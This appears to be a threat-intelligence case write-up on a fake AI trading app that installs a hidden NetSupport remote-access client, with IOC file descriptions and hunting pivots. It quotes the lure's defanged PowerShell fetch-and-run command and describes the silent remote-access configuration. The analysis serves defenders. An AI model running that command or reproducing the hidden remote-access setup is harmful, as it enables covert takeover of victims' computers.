# 2026-11 "quantai": how a fake AI trading tool installs a remote-access trojan

November 2026. Two review videos on a YouTube channel that looks hijacked (about 190,000 views combined by 10 Nov 2026) link to a lure site for a fake "Quant" AI market-intelligence app; the real product that is imitated is not part of the campaign. The dashboard tells the visitor to paste a PowerShell command (ClickFix style): `irm hxxps://<lure-domain>/install | iex`.

- **Gate:** behind Cloudflare; the script is served only to a Windows PowerShell 5.1 user agent (browsers, curl and PowerShell 7 get a 403 page).
- **Stage 1** sends the computer name to a second domain. **Stage 2** creates `%LOCALAPPDATA%\Stoservice`, downloads two AES-encrypted 7z archives and a genuine 7-Zip binary, unpacks a NetSupport Manager client 14.12 renamed `stservice.exe` (vendor-signed, original name `client32.exe`) and drops a shortcut into the Startup folder.
- **The malicious part** is `client32.ini` (silent mode, no tray icon, user cannot disconnect, 19 s check-in, HTTP gateway on port 2084 plus a backup gateway) and a cracked licence file.
- **C2 rotation:** the gateway domains (registered 2026-06-15) pointed at one VPS on 9 Nov and at another around 07:00 UTC on 10 Nov; port 2084 answered only in short windows.

Static analysis only; nobody connected to the attacker's servers. Not established: who runs the campaign; the macOS route; the loader URL named in stage 1 was gated, so the loader analysed came from a sibling path on the same host (match inferred).

## Hunting pivots
- Web requests with a Windows PowerShell 5.1 user agent to new or recently changed domains; PowerShell logs (4104) containing `irm ... | iex`.
- NetSupport client (OriginalFilename `client32.exe`) running from AppData, Temp or Users\Public; `client32.ini` with `GatewayAddress` and `silent=1` / `SysTray=0` outside a managed deployment; outbound TCP 2084.
- `stservice.lnk` in the Startup folder. If NetSupport is not used in your environment, block it by publisher or hash.

## Detections
No rules yet (see the roadmap in the top README). The IOC set is the deliverable.

## Samples
None of the hashes in this case were on MalwareBazaar at the time of checking, and none were submitted by this project. The signed NetSupport binaries (`stservice.exe`, `vh.exe`) are legitimate software abused by the operator, so hash-blocking them alone is not advised. ThreatFox: no entries submitted by this project for this case.

Video: https://youtu.be/FjaMrGFCiHs (scheduled for 2026-11-26).

## Files

- `iocs.csv`: columns `type,value_defanged,first_seen,role,verdict,confidence,source`. Values are defanged (`hxxps://`, `[.]`); hashes are plain.
- `iocs.json`: **machine-readable, NOT defanged** (the first key `_warning` says so). Do not browse or fetch the values. Same rows as the CSV.
- Verdict values: `malicious`, `candidate` (pattern match, link not confirmed), `compromised-or-abused-legit` (a legitimate site or brand that was hijacked or abused; block by path, not by domain), `shared-or-legit-infrastructure` (do NOT block: shared CDN edge, public RPC, genuine decoy file), `related-not-in-build`.
- Not included on purpose: archive passwords, API keys, encryption keys and decoding recipes. Block the C2 domains, not the shared Cloudflare or hosting addresses.
- License: CC0 1.0.

